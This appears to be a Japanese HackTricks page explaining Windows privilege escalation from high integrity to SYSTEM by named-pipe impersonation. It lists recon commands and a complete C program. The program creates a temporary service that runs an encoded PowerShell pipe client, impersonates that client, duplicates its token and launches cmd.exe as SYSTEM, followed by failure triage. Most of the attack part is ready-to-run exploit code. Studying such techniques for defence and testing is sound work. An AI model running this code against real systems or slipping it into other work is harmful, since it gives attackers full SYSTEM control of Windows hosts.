# Name Pipes を使用して High Integrity から SYSTEM へ

{{#include ../../banners/hacktricks-training.md}}

これは named-pipe impersonation の **administrator/SCM variant** です。elevated process が一時的な service を作成し、その child が `SYSTEM` として接続した後、その client を impersonate します。開始時の context で service を作成できないものの `SeImpersonatePrivilege` を持っている場合は、代わりに privileged-service coercion を使用してください。詳しくは [Named Pipe Client Impersonation](named-pipe-client-impersonation.md) および [RoguePotato, PrintSpoofer, SharpEfsPotato, GodPotato](roguepotato-and-printspoofer.md) を参照してください。service の作成には SCM への access と、新しい service に対する `SERVICE_START` access が必要です。また、`CreateProcessWithTokenW` には `SeImpersonatePrivilege` が必要です。<sup>[[2]](#references)[[3]](#references)</sup>

想定される開始時の context をすばやく確認します：
```cmd
whoami /groups | findstr /i "High Mandatory"
whoami /priv | findstr /i "SeImpersonatePrivilege"
sc.exe query PiperSrv
```
**コードフロー:**

1. サービスを開始する**前に**名前付きパイプサーバーを作成します。待機時には、`ConnectNamedPipe` が `FALSE` と `ERROR_PIPE_CONNECTED` を返した場合も成功として扱います。これは、`CreateNamedPipe` と `ConnectNamedPipe` の間にクライアントが競合に勝って接続したことを意味します。<sup>[[4]](#references)</sup>
2. 作成したパイプに接続して何かを書き込むサービスを作成し、開始します。サービスコードは、次のエンコードされた PS code を実行します。`$pipe = new-object System.IO.Pipes.NamedPipeClientStream("piper"); $pipe.Connect(); $sw = new-object System.IO.StreamWriter($pipe); $sw.WriteLine("Go"); $sw.Dispose();`
3. サービスが接続して書き込んだ後、`ImpersonateNamedPipeClient` を呼び出し、生成された thread token を開いて、primary token として複製します。<sup>[[1]](#references)</sup>
4. その primary token を使用して `cmd.exe` を起動します。<sup>[[2]](#references)</sup>

この手法では、呼び出し元がサービスを作成および開始でき、`CreateProcessWithTokenW` に必要な privileges（通常は `SeImpersonatePrivilege`）を保有していることを前提とします。これは high-integrity-to-SYSTEM technique であり、任意の低権限ユーザーが利用できる primitive ではありません。<sup>[[2]](#references)[[3]](#references)</sup>

> [!WARNING]
> サービスの作成または開始に失敗した場合、このサンプルは pipe thread に通知せず、無期限に待機する可能性があります。lab の外で使用する前に、エラーハンドリングと overlapped pipe timeout を追加してください。また、衝突を避けるため、ランダムな pipe/service name を使用してください。

`ImpersonateNamedPipeClient` は、**最後に読み取られたメッセージ**に関連付けられた context を採用するため、接続だけでは不十分です。privileged client に書き込ませ、`ReadFile` がデータを返したことを確認してから impersonate してください。thread impersonation token を `SecurityImpersonation` を指定した `TokenPrimary` token に複製してください。process-creation API が使用するのは primary token です。<sup>[[1]](#references)[[5]](#references)</sup>
```c
#include <windows.h>
#include <time.h>

#pragma comment (lib, "advapi32")
#pragma comment (lib, "kernel32")

#define PIPESRV "PiperSrv"
#define MESSAGE_SIZE 512

DWORD WINAPI ServiceGo(LPVOID lpParam) {

SC_HANDLE scManager;
SC_HANDLE scService;

scManager = OpenSCManager(NULL, SERVICES_ACTIVE_DATABASE, SC_MANAGER_ALL_ACCESS);

if (scManager == NULL) {
return FALSE;
}

// create Piper service
scService = CreateServiceA(scManager, PIPESRV, PIPESRV, SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS,
SERVICE_DEMAND_START, SERVICE_ERROR_NORMAL,
"C:\\Windows\\System32\\cmd.exe /c powershell.exe -EncodedCommand JABwAGkAcABlACAAPQAgAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAEkATwAuAFAAaQBwAGUAcwAuAE4AYQBtAGUAZABQAGkAcABlAEMAbABpAGUAbgB0AFMAdAByAGUAYQBtACgAIgBwAGkAcABlAHIAIgApADsAIAAkAHAAaQBwAGUALgBDAG8AbgBuAGUAYwB0ACgAKQA7ACAAJABzAHcAIAA9ACAAbgBlAHcALQBvAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ASQBPAC4AUwB0AHIAZQBhAG0AVwByAGkAdABlAHIAKAAkAHAAaQBwAGUAKQA7ACAAJABzAHcALgBXAHIAaQB0AGUATABpAG4AZQAoACIARwBvACIAKQA7ACAAJABzAHcALgBEAGkAcwBwAG8AcwBlACgAKQA7AA==",
NULL, NULL, NULL, NULL, NULL);

if (scService == NULL) {
//printf("[!] CreateServiceA() failed: [%d]\n", GetLastError());
return FALSE;
}

// launch it
StartService(scService, 0, NULL);

// wait a bit and then cleanup
Sleep(10000);
DeleteService(scService);

CloseServiceHandle(scService);
CloseServiceHandle(scManager);
}

int main() {

LPCSTR sPipeName = "\\\\.\\pipe\\piper";
HANDLE hSrvPipe;
HANDLE th;
BOOL bPipeConn;
char pPipeBuf[MESSAGE_SIZE];
DWORD dBRead = 0;

HANDLE hImpToken;
HANDLE hNewToken;
STARTUPINFOW si;
PROCESS_INFORMATION pi;

// open pipe
hSrvPipe = CreateNamedPipeA(sPipeName, PIPE_ACCESS_DUPLEX, PIPE_TYPE_MESSAGE | PIPE_WAIT,
PIPE_UNLIMITED_INSTANCES, 1024, 1024, 0, NULL);

// create and run service
th = CreateThread(0, 0, ServiceGo, NULL, 0, 0);

// wait for the connection from the service
bPipeConn = ConnectNamedPipe(hSrvPipe, NULL);
if (!bPipeConn && GetLastError() == ERROR_PIPE_CONNECTED) {
bPipeConn = TRUE; // Client connected between CreateNamedPipe and ConnectNamedPipe
}
if (bPipeConn) {
if (!ReadFile(hSrvPipe, &pPipeBuf, MESSAGE_SIZE, &dBRead, NULL) || dBRead == 0) {
return -6;
}

// impersonate the service (SYSTEM)
if (ImpersonateNamedPipeClient(hSrvPipe) == 0) {
return -1;
}

// wait for the service to cleanup
WaitForSingleObject(th, INFINITE);

// get a handle to impersonated token
if (!OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &hImpToken)) {
return -2;
}

// create new primary token for new process
if (!DuplicateTokenEx(hImpToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation,
TokenPrimary, &hNewToken)) {
return -4;
}

//Sleep(20000);
// spawn cmd.exe as full SYSTEM user
ZeroMemory(&si, sizeof(si));
si.cb = sizeof(si);
ZeroMemory(&pi, sizeof(pi));
if (!CreateProcessWithTokenW(hNewToken, 0, L"C:\\Windows\\System32\\cmd.exe", NULL,
CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi)) {
return -5;
}

// revert back to original security context
RevertToSelf();

}

return 0;
}
```
### 失敗時のトリアージ

- `ConnectNamedPipe == FALSE` かつ `ERROR_PIPE_CONNECTED` の場合: 継続する。パイプはすでに接続されている。<sup>[[4]](#references)</sup>
- `ImpersonateNamedPipeClient` が `ERROR_CANNOT_IMPERSONATE` (`1368`) で失敗する場合: SYSTEM クライアントが実際にデータを書き込み、`ReadFile` が完了したことを確認する。また、クライアントが要求した impersonation level も確認する。identification/anonymous-level クライアントは完全には impersonate できない。<sup>[[1]](#references)</sup>
- `CreateProcessWithTokenW` が `ERROR_PRIVILEGE_NOT_HELD` (`1314`) で失敗する場合: 元の caller が `SeImpersonatePrivilege` を保持していない。high-integrity administrator context からは、[SeImpersonate from High To System](seimpersonate-from-high-to-system.md) に記載されている token-copy route を使用するか、必要な privileges が存在する場合は SYSTEM を impersonate しながら `CreateProcessAsUserW` を使用する。<sup>[[2]](#references)</sup>
- `CreateServiceA` が `ERROR_SERVICE_EXISTS` (`1073`) を返す場合: 古い `PiperSrv` エントリを削除するか、`PIPESRV` を randomize する。trigger の後には必ず temporary service を削除する。<sup>[[3]](#references)</sup>



## References

- [1] [Microsoft Learn — `ImpersonateNamedPipeClient`](https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-impersonatenamedpipeclient)
- [2] [Microsoft Learn — `CreateProcessWithTokenW`](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithtokenw)
- [3] [Microsoft Learn — `CreateServiceA`](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-createservicea)
- [4] [Microsoft Learn — `ConnectNamedPipe`](https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-connectnamedpipe)
- [5] [Microsoft Learn — `DuplicateTokenEx`](https://learn.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-duplicatetokenex)
{{#include ../../banners/hacktricks-training.md}}
